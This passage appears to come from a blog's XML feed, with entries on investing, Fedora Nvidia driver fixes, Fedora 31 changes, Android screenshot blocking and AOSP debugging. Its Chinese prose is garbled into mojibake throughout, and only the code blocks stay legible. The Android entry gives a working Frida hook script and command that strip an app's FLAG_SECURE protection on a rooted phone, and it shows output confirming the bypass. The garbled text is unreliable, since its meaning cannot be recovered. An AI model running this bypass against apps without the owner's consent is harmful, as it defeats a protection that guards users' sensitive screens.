çš„å°±è¯´æ˜å®å¤„ä¸å¤Ÿï¼Œè¦å¤šæ£€è®¨ä¸‹è‡ªå·±å¯¹ç¡®å®šæ€§çš„æŠŠæ¡èƒ½åŠ›ã€‚</p><p>ï¼ˆäº”ï¼‰èµ„äº§å°±æ˜¯é‡‘é’±åœ¨ä¸åŒæ—¶é—´ä¸‹çš„ä¸åŒå±æ€§ï¼Œæœ¬è´¨å°±æ˜¯ç°åœ¨çš„é’±å’Œæœªæ¥çš„é’±ä¹‹é—´è¿›è¡Œäº¤æ¢ï¼Œä¹°å…¥æ˜¯ç”¨ç°åœ¨æ¢æœªæ¥ï¼Œå–å‡ºåˆ™æ˜¯æŠŠæœªæ¥æ¢ç°åœ¨ï¼Œå…³é”®è¦æƒ³æ˜ç™½æœªæ¥å’Œç°åœ¨è°æ›´å€¼é’±å°±å¥½äº†ã€‚ç‰›ç†Šå¸‚å°±æ˜¯è¿™æ ·çš„ä¸€ä¸ªåˆ¤æ–­ä¾æ®ï¼Œå½“ç„¶ï¼Œå¯¹æå°‘æ•°çš„ä¼˜å¼‚å…¬å¸æ¥è¯´ï¼Œæœªæ¥æ€»æ˜¯ä¼šå¼ºè¿‡ç°åœ¨çš„ï¼Œè¿™å°±æ˜¯æ¯”ç‰›ç†Šå¤§åŠ¿æ›´å¤§çš„å¤§åŠ¿ã€‚</p><p>ï¼ˆå…­ï¼‰å¸‚åœºåœ¨ä¸æ–­å˜åŒ–ï¼Œä¼ä¸šä¹Ÿåœ¨ä¸æ–­å˜åŒ–ï¼Œå˜åŒ–æ˜¯å¸¸æ€ï¼Œæ‰€ä»¥ä»»ä½•æ—¶å€™éƒ½è¦å¤šæ–¹å‘çš„åå¤å®¡è§†ï¼Œå¯¹ä¸–ç•Œæœ‰æ•¬ç•å¿ƒã€‚è¿™ä¸ªæ•¬ç•å°±æ˜¯è¦è®¤è¯†åˆ°äº‹ç‰©æ€»æ˜¯åœ¨ä¸æ–­å˜åŒ–å’Œå‡ºç°æ„å¤–çš„ï¼Œæ‰€ä»¥è¦å°½é‡è®©è‡ªå·±å¤„äºæœ‰ä¿æŠ¤çš„çŠ¶æ€ï¼Œå°½é‡å¤šçš„å‡è®¾æç«¯æƒ…å†µä¸‹çš„å¯é æ€§ã€‚</p><p>ï¼ˆä¸ƒï¼‰å½“å…¨ä¸–ç•Œéƒ½æƒ³é€šè¿‡è‚¡å¸‚æ¥å¯¹æŠ—é€šè´§è†¨èƒ€çš„æ—¶å€™ï¼Œä¹Ÿè®¸æ‹¿ç€ç°é‡‘è®©å…¶è‡ªç„¶è´¬å€¼ä¼šæ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚é™¤éä½ èƒ½æ‰¾åˆ°æ˜ç¡®çš„æ–°å¢é¢„æœŸï¼Œå¦åˆ™å‡­ä»€ä¹ˆæŒ‡æœ›åˆ«äººä»¥æ›´é«˜çš„ä»·é’±æ¥è´­ä¹°å·²ç»ç»™ä»–äººæä¾›è¿‡ä¿å€¼æœºä¼šçš„èµ„äº§å‘¢ï¼ˆæˆ¿åœ°äº§ï¼‰ã€‚</p><p>ï¼ˆå…«ï¼‰æ¯ä¸ªé˜¶æ®µçš„ä¾§é‡ç‚¹æ˜¯ä¸ä¸€æ ·çš„ã€‚åœ¨é«˜ä½çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¦åšè®¡ç®—é¢˜ï¼Œè¦å®šé‡ã€‚å› ä¸ºä¸€åªè‚¡ç¥¨æ¶¨äº†è¿™ä¹ˆå¤šã€è¿™ä¹ˆé•¿æ—¶é—´ï¼Œå®ƒçš„æ–¹å‘ä¸€å®šæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œè¿™ä¸ªæ—¶å€™ä½ å†å»åšå®šæ€§ç ”ç©¶æ„ä¹‰ä¸å¤§ã€‚åœ¨ä½ä½çš„æ—¶å€™ï¼Œå¦‚æœä½ å†å»ç®—è´¦ï¼Œå°±å¾ˆå®¹æ˜“åƒå¤§äºã€‚å®ƒè·Œäº†è¿™ä¹ˆä¹…ï¼Œé‚£ä¸€å®šæ˜¯æ–¹å‘ä¸Šå‡ºäº†é—®é¢˜ï¼Œä½ è¦æŠŠæ–¹å‘ç»™æƒ³æ˜ç™½ã€‚å¦‚æœèƒ½æŠŠæ–¹å‘è¯ä¼ªæ‰ï¼Œæ˜¯ä¸éœ€è¦è€ƒè™‘å®šé‡çš„é—®é¢˜ï¼Œå› ä¸ºä½ä½å¤©ç„¶å¸¦æœ‰å¼¹æ€§å’Œèµ”ç‡ã€‚</p><p>ï¼ˆä¹ï¼‰çœŸæ­£çš„æŠ•æœºåº”è¯¥æ˜¯åœ¨ä»·å€¼çš„åŸºç¡€ä¸Šè¿›è¡Œçš„ï¼Œæ˜¯é€šè¿‡å……åˆ†çš„ä»·å€¼ç†è§£åï¼Œå°†å…¶åœ¨ä¸åŒäººç¾¤æˆ–ç¯å¢ƒä¸‹è¿›è¡Œåˆ‡æ¢æ¥è·ç›Šã€‚å®ƒè®¤è¯†åˆ°ä»·å€¼æœ‰ä¸»è§‚å€¾å‘æ€§å’Œä¸ªæ€§åŒ–çš„ç‰¹ç‚¹ï¼Œä»·å€¼ä¸æ˜¯ä¸ªç¨³å®šå…·ä½“çš„ä¸œè¥¿ï¼Œä¹Ÿä¸å­˜åœ¨ç”¨ä»€ä¹ˆæ–¹æ³•æ¨ç®—çš„å…¬å…å€¼ï¼Œå› ä¸ºèµ„æœ¬ä»¥åŠèµ„æœ¬åé¢çš„äººæ˜¯ä¸°å¯Œä¸åŒçš„ï¼Œä»–ä»¬æœ‰ç€ä¸åŒçš„æˆæœ¬å’Œæ”¶ç›Šé¢„æœŸï¼Œåœ¨å„ç§å¸‚åœºç¯å¢ƒä¸‹ä¹Ÿä¼šæœ‰ç€ä¸åŒçš„é¢„æœŸå› å­å’Œè´´ç°ç‡ï¼Œè€Œè¿™äº›åœ¨ä¹˜æ•°å’Œå¤åˆ©è®¡ç®—çš„åŸºç¡€ä¸‹å°±ä¼šæœ‰ç€å·¨å¤§çš„å·®å¼‚ã€‚è¿™ä¹Ÿè¯´æ˜äº†ä¸ºä»€ä¹ˆç†æ€§ä¸”ä¿¡æ¯å……åˆ†å¯¹ç§°çš„äººä¹‹é—´ä¹Ÿå¯ä»¥äº§ç”Ÿäº¤æ˜“å¹¶å®ç°åŒèµ¢ï¼Œå…¶åŸå› å°±åœ¨äºä»–ä»¬æœ‰ç€ä¸åŒçš„ä»·å€¼è§‚ã€éœ€æ±‚ç‰¹ç‚¹å’Œæ»¡è¶³æ„Ÿã€‚</p><p>ï¼ˆåï¼‰é•¿çº¿æŠ•èµ„å¾ˆå¤šäººè®¤ä¸ºè¿™æ˜¯æœ€å®¹æ˜“åšçš„ï¼Œåªè¦ä¹°è¿›ä¸åŠ¨å°±å¯ä»¥äº†ï¼Œå…¶å®è¿™å®Œå…¨æ˜¯è¯¯è§£ã€‚åœ¨æ‰€æœ‰çš„æ“ä½œç­–ç•¥ä¸­ï¼Œé•¿çº¿çš„è¦æ±‚æœ€é«˜ã€‚ä»–éœ€è¦å¯¹ä¼ä¸šæœ‰ç€æä¸ºæ·±åˆ»çš„è®¤è¯†ï¼Œå¯¹è‡ªå·±æœ‰ç€æ›´ä¸ºåšå¼ºçš„æ§åˆ¶ã€‚ä»–æ¸…æ¥šæŠŠæ¡ä¼ä¸šæœªæ¥æ•°å¹´çš„å‘å±•è¶‹åŠ¿ï¼Œä»¥æŠ•èµ„çš„å¿ƒæ€åˆ†äº«ä¼ä¸šçš„æˆé•¿ã€‚ä»–çš„æ ‡çš„ç‰©æ˜¯åƒé‡ŒæŒ‘ä¸€ï¼Œåœ¨è¿™æ ·çš„æœºä¼šé¢å‰å®ƒä¸ä¼šæƒ§æ€•ä»»ä½•äºæŸï¼Œä¸ä¼šè®¾ç½®é™¤åŸºæœ¬é¢å¤–çš„ä»»ä½•æ­¢æŸæŒ‡æ ‡ã€‚è‡ªä¿¡ã€å°Šé‡å®¢è§‚ä»·å€¼ã€ä¸ç†ä¼šä¹ƒè‡³å‹‡äºå¯¹æŠ—å¸‚åœºæ˜¯å¿…å¤‡çš„æŠ•èµ„å“è´¨ï¼Œæ—¥å¸¸çš„æ³¢åŠ¨åœ¨è¿™æ ·çš„å‰æ™¯é¢å‰æ˜¯ä¸åº”å»è€ƒè™‘çš„ã€‚åªæœ‰è¿™æ ·ï¼Œè‚¡ç¥¨æ‰èƒ½å¤ŸçœŸæ­£æˆä¸ºæ”¹å˜ä¸€ç”Ÿçš„ä¸œè¥¿ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‡çº§ Fedora 36ï¼Œé‡ä¸Š Nvidia é©±åŠ¨é—®é¢˜</title>
    <link href="/cn/Fedora36-Nvidia/"/>
    <url>/cn/Fedora36-Nvidia/</url>
    
    <content type="html"><![CDATA[<p>Fedora 36 æ­£å¼ç‰ˆå·²ç»é‡Šå‡ºä¸€æ®µæ—¶é—´äº†ï¼Œæ ¹æ®æˆ‘çš„ç»éªŒå¼€å§‹çš„ä¸€å‘¨éƒ½ä¼šæœ‰ bugï¼Œä¸€èˆ¬ç­‰ä¸€æ®µæ—¶é—´å†å‡çº§ä¼šæ›´å¹³æ»‘ä¸€äº›ã€‚ç„¶è€Œï¼Œè€é©å‘½åˆé‡ä¸Šäº†æ–°é—®é¢˜ï¼Œæ˜¾ç¤ºå‡ºé—®é¢˜äº†å¯åŠ¨ä¸èµ·æ¥ã€‚æˆ‘å·²ç»å¾ˆä¹…æ²¡æœ‰é‡ä¸Šæ˜¾ç¤ºé©±åŠ¨é—®é¢˜äº†ï¼Œæˆ‘åœ¨å¾ˆä¹…ä»¥å‰å°±ç¦ç”¨äº†å¼€æºé©±åŠ¨ <code>nouveau</code>ï¼Œä¸€ç›´éƒ½ç”¨å¾—å¾ˆå¥½ã€‚</p><p>ä¿®æ”¹ &#x2F;etc&#x2F;default&#x2F;grub æ–‡ä»¶ï¼Œåœ¨ <code>GRUB_CMDLINE_LINUX</code> æ·»åŠ ä¸‹é¢å‚æ•°</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">GRUB_CMDLINE_LINUX</span>=<span class="hljs-string">&quot;... rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1&quot;</span><br></code></pre></td></tr></table></figure><p>é‡æ–°ç”Ÿæˆ grub æ–‡ä»¶ï¼Œ <code>sudo grub2-mkconfig -o /boot/grub2/grub.cfg</code>ï¼Œä½†æ˜¯åœ¨å‡çº§ Fedora 36 åä¼¼ä¹æ²¡æœ‰èµ·ä½œç”¨ã€‚è¯¡å¼‚çš„æ˜¯ Fedora 35 çš„å†…æ ¸å´å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œé¦–å…ˆæ€€ç–‘çš„æ˜¯ nvidia é©±åŠ¨å¯èƒ½æ²¡æœ‰å®‰è£…å¯¹ã€‚æ‰§è¡Œä¸‹é¢å‘½ä»¤è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf reinstall xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64<br>sudo reboot<br></code></pre></td></tr></table></figure><p>å¯æƒœæ²¡æœ‰è§£å†³é—®é¢˜ï¼Œä¸Šç½‘æ‰¾èµ„æ–™çœ‹çœ‹ Fedora 36 æœ‰æ²¡ä»€ä¹ˆç‰¹æ®Šçš„åœ°æ–¹ã€‚å®‰è£… Nvidia é©±åŠ¨ç½‘ä¸Šæœ‰è¿™ç¯‡æ–‡ç« è¯´çš„è¯¦ç»†<br><a href="https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/">https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/</a><br>ä»”ç»†æ‹œè¯»äº†ä¸€ä¸‹ï¼Œè¿˜æ˜¯æ²¡æœ‰å‘ç°å•¥é—®é¢˜ï¼Œé©±åŠ¨ä¹Ÿé‡æ–°å®‰è£…äº†å•Šï¼Œå¼€å§‹æ€€ç–‘æ˜¯æ–°ç‰ˆ Nvidia é©±åŠ¨çš„é—®é¢˜</p><p><code>sudo dnf search xorg-x11-drv-nvidia</code> å¯ä»¥æŸ¥çœ‹æ‰€æœ‰çš„é©±åŠ¨ï¼Œ<code>xorg-x11-drv-nvidia-340xx</code> <code>xorg-x11-drv-nvidia-340xx</code> <code>xorg-x11-drv-nvidia-340xx</code> ä¸çŸ¥é“åˆ°åº•éœ€è¦å®‰è£…å“ªä¸ªç‰ˆæœ¬çš„é©±åŠ¨ã€‚ğŸ˜­</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs subunit">xorg-x11-drv-nvidia.x86_64 : NVIDIA&#x27;s proprietary display driver for NVIDIA graphic cards<br>=========================================================================== åç§° å’Œ æ¦‚å†µ åŒ¹é…ï¼šxorg-x11-drv-nvidia<br>xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx-cuda.x86_64 : CUDA libraries for xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx-devel.i686 : Development files for xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx kernel module source code<br>xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx-libs.i686 : Libraries for xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-devel.i686 : Development files for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx kernel module source code<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-libs.i686 : Libraries for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-devel.i686 : Development files for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx kernel module source code<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-libs.i686 : Libraries for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br></code></pre></td></tr></table></figure><p>å¯æ˜¯ä»”ç»†ä¸€ç¢ç£¨ï¼Œ Fedora 35 Nvidia é©±åŠ¨ä¸æ˜¯å·¥ä½œæ­£å¸¸å—ï¼Œå¯ä»¥ä¸Šå»çœ‹çœ‹ç”¨çš„æ˜¯å“ªä¸ªç‰ˆæœ¬çš„é©±åŠ¨ï¼Œæ‰§è¡Œå‘½ä»¤ <code>nvidia-settings</code>,åœ¨ System Information ä¸­å‘ç°ä½¿ç”¨çš„å°±æ˜¯æœ€æ–°ç‰ˆæœ¬çš„é©±åŠ¨ <strong>510.68.02</strong>ï¼Œçœ‹æ ·å­æœ€æ–°ç‰ˆæœ¬çš„é©±åŠ¨ä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œä¸€ä¸‹é™·å…¥äº†å›°å¢ƒã€‚ğŸ˜°</p><p>æ²¡å•¥å¥½åŠæ³•ï¼Œè¿˜æ˜¯ Google æœç´¢ä¸€ä¸‹ï¼Œç»“æœå‘ç°äº†ä¸€ä¸ªé“¾æ¥åœ¨è®¨è®ºè¿™ä¸ªé—®é¢˜ï¼Œå’Œæˆ‘é‡ä¸Šçš„ç°è±¡ä¸€æ ·ï¼Œä½œè€…æœ€ç»ˆè§£å†³äº†é—®é¢˜<br><a href="https://ask.fedoraproject.org/t/fedora-linux-kernel-update-breaks-nvidia-driver/21954/11">Fedora Linux kernel update breaks NVIDIA driver</a></p><p>åŸæ¥æ˜¯æ—§ç‰ˆçš„é©±åŠ¨æ²¡æœ‰å¸è½½å¹²å‡€ï¼Œå‚è€ƒ <a href="https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver">https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver</a><br>é©±åŠ¨å¸è½½ Nvidia é©±åŠ¨éœ€è¦ä½¿ç”¨å‘½ä»¤ <code>dnf remove xorg-x11-drv-nvidia\*</code></p><p>æŒ‰ç…§ä¸‹é¢çš„å‘½ä»¤æ“ä½œäº†ä¸€éï¼Œé‡å¯ç³»ç»Ÿï¼Œç†Ÿæ‚‰çš„ç™»å½•ç•Œé¢ç»ˆäºåˆå‡ºç°äº†ã€‚ğŸ˜„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf remove xorg-x11-drv-nouveau<br>sudo dnf remove xorg-x11-drv-nvidia\*<br>sudo dnf install xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64<br>sudo reboot<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fedora31 çš„å‡ ä¸ªå˜åŒ–</title>
    <link href="/cn/Fedora31/"/>
    <url>/cn/Fedora31/</url>
    
    <content type="html"><![CDATA[<h2 id="1-é»˜è®¤å¯ç”¨-Cgroups-V2"><a href="#1-é»˜è®¤å¯ç”¨-Cgroups-V2" class="headerlink" title="1. é»˜è®¤å¯ç”¨ Cgroups V2"></a>1. é»˜è®¤å¯ç”¨ Cgroups V2</h2><p>nozuonodieï¼Œ å‡çº§åˆ° Fedora 31 åï¼Œ CgroupsV2 å·²ç»é»˜è®¤å¼€å¯ï¼Œç†ç”±æ˜¯åŸæ¥ä¸æ˜¯é»˜è®¤å¼€å¯æ²¡äººç”¨ï¼Œç°åœ¨è®© Fedora ç”¨æˆ·å…ˆå½“å½“å°ç™½é¼ ï¼Œ<br>äºæ˜¯ Docker å°±å€’ä¸‹äº†ã€‚<a href="http://t.cn/Ai1sI5LH">http://t.cn/Ai1sI5LH</a>   grub2 é…ç½®æ–‡ä»¶ &#x2F;etc&#x2F;default&#x2F;grubï¼Œ å†…æ ¸å‚æ•°æ·»åŠ  systemd.unified_cgroup_hierarchy&#x3D;0<br>å¯ä»¥é‡æ–°å¼€å¯  CgroupsV1 â€‹â€‹â€‹â€‹</p><h2 id="2-é»˜è®¤çš„-Python-ä¸º-Python3"><a href="#2-é»˜è®¤çš„-Python-ä¸º-Python3" class="headerlink" title="2. é»˜è®¤çš„ Python ä¸º Python3"></a>2. é»˜è®¤çš„ Python ä¸º Python3</h2><p><a href="https://fedoraproject.org/wiki/Changes/Python_means_Python3">https://fedoraproject.org/wiki/Changes/Python_means_Python3</a></p><p>å”‰ï¼Œä¸å¾—ä¸è¯´ Fedora è¿™æ¬¡æœ‰ç‚¹å¤ªæ¿€è¿›äº†ï¼Œ æå¾—æˆ‘ç¼–è¯‘ chromium åˆå‡ºé—®é¢˜äº†ã€‚ è¦æ¢å›å»æœ‰ä¸ªæ­ªæ‹›</p><p><code>ln -s /usr/bin/python2 /usr/local/bin/python</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ¢å¤ Android App çš„æˆªå±åŠŸèƒ½</title>
    <link href="/cn/disable_security_flags/"/>
    <url>/cn/disable_security_flags/</url>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©é‡ä¸ŠæŸ App ç¦æ­¢æˆªå±ï¼Œå…¶å®å°±æ˜¯ä½¿ç”¨äº†ä¸‹é¢è¿™æ®µä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">getWindow().setFlags(LayoutParams.FLAG_SECURE, LayoutParams.FLAG_SECURE);<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ frida è„šæœ¬å¯ä»¥ç»•è¿‡ç»•è¿‡è¿™ä¸ªé™åˆ¶ ï¼ˆä½¿ç”¨ frida éœ€è¦å°†æ‰‹æœº rootï¼‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>   <span class="hljs-comment">// https://developer.android.com/reference/android/view/WindowManager.LayoutParams.html#FLAG_SECURE</span><br>   <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">FLAG_SECURE</span> = <span class="hljs-number">0x2000</span>;<br>   <span class="hljs-keyword">var</span> <span class="hljs-title class_">Window</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.view.Window&quot;</span>);<br>   <span class="hljs-keyword">var</span> setFlags = <span class="hljs-title class_">Window</span>.<span class="hljs-property">setFlags</span>;  <span class="hljs-comment">//.overload(&quot;int&quot;, &quot;int&quot;)</span><br><br>   setFlags.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">flags, mask</span>) &#123;<br>       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Disabling FLAG_SECURE...&quot;</span>);<br>       flags &amp;= ~<span class="hljs-variable constant_">FLAG_SECURE</span>;<br>       setFlags.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, flags, mask);<br>       <span class="hljs-comment">// Since setFlags returns void, we don&#x27;t need to return anything</span><br>   &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ frida å‘½ä»¤ <code>frida -U -l disable.js -n com.apps.android --no-pause</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> frida -U -l disable.js -n com.apps.android --<span class="hljs-keyword">no</span>-pause<br><br>[Pixel <span class="hljs-number">2</span>::com.apps.android]-&gt;<br>[Pixel <span class="hljs-number">2</span>::com.apps.android]-&gt;<br>[Pixel <span class="hljs-number">2</span>::com.apps.android]-&gt; Disabling FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br></code></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä½¿ç”¨äº† <code>-n</code> å‚æ•°ï¼Œ attach åˆ°ç›®æ ‡è¿›ç¨‹ï¼Œè¦ä¸ App ä¼šè‡ªåŠ¨é‡å¯ã€‚çœ‹åˆ°è¾“å‡ºè°ƒè¯•ä¿¡æ¯åï¼Œ<br>å°±å¯ä»¥æ­£å¸¸æˆªå±äº†ã€‚</p><h3 id="ä½¿ç”¨-objection"><a href="#ä½¿ç”¨-objection" class="headerlink" title="ä½¿ç”¨ objection"></a>ä½¿ç”¨ objection</h3><p>objectionã€Œ2ã€æœ‰æ­¤åŠŸèƒ½ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤å³å¯ï¼š <code>android ui FLAG_SECURE false</code>  ä½†æ˜¯æˆ‘æµ‹è¯•å¤±è´¥äº†ã€‚</p><h3 id="æˆªå±å°æŠ€å·§-ï¼ˆlzxï¼‰"><a href="#æˆªå±å°æŠ€å·§-ï¼ˆlzxï¼‰" class="headerlink" title="æˆªå±å°æŠ€å·§ ï¼ˆlzxï¼‰"></a>æˆªå±å°æŠ€å·§ ï¼ˆlzxï¼‰</h3><p>Android æˆªå±ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªå¿«é€Ÿçš„æŠ€å·§  <code>adb exec-out screencap -p &gt; test.png</code></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li>[1] <a href="https://bhamza.me/2019/11/03/Android-Frida-hooking-disabling-FLAG-SECURE.html">https://bhamza.me/2019/11/03/Android-Frida-hooking-disabling-FLAG-SECURE.html</a></li><li>[2] <a href="https://github.com/sensepost/objection">https://github.com/sensepost/objection</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è°ƒè¯•AOSP Java ä»£ç </title>
    <link href="/cn/debug_aosp_java_code/"/>
    <url>/cn/debug_aosp_java_code/</url>
    
    <content type="html"><![CDATA[<p>ä¸‹è½½ Android æºä»£ç ï¼Œç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">source</span> build/envsetup.sh<br>$ lunch<br>$ make<br>$ mmm development/tools/idegen/<br>$ ./development/tools/idegen/idegen.sh<br></code></pre></td></tr></table></figure><p>è¿è¡Œåå°†ç”Ÿæˆä¸‹é¢å‡ ä¸ªæ–‡ä»¶</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">android<span class="hljs-selector-class">.ipr</span> (IntelliJ / Android Studio)<br>android<span class="hljs-selector-class">.iml</span> (IntelliJ / Android Studio)<br><span class="hljs-selector-class">.classpath</span>  (Eclipse)<br></code></pre></td></tr></table></figure><ol><li>åœ¨Android Studio ä¸­å¯¼å…¥ android.ipr</li></ol><p>File -&gt; Open é€‰æ‹© android.ipr, 